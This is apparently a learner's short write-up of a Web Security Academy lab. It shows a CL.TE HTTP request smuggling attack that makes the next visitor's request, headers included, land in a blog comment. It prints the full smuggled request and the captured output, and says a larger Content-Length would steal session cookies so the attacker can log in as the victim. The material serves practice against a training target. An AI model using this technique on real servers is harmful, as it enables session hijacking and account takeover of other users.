I am unable to solve this lab due to my network firewall, however I was able to 
exploit this lab on myself which wouldve solved the lab.

first sending this request:
"
POST / HTTP/1.1
Host: 0a6f0011037c31aa82e5ab18005500e6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 275
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 252
Cookie: session=ofgfLrvgkj34jzWuOUZHSa7Qd3RQE5ND

csrf=kEUx7OlJpa1F1HmNStpBWXXdJcMjLNfm&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test

"

this then allows for the next users request, any request, to end up in my comment, giving the comment of:
"testGET / HTTP/1.1 Host: 0a6f0011037c31aa82e5ab18005500e6.web-security-academy.net sec-ch-ua: "Google Chrome";v="119", "Chromium";v="11"

i could set the length of the content length higher to extract cookies and then log in as the user, which is how 
to complete the lab...
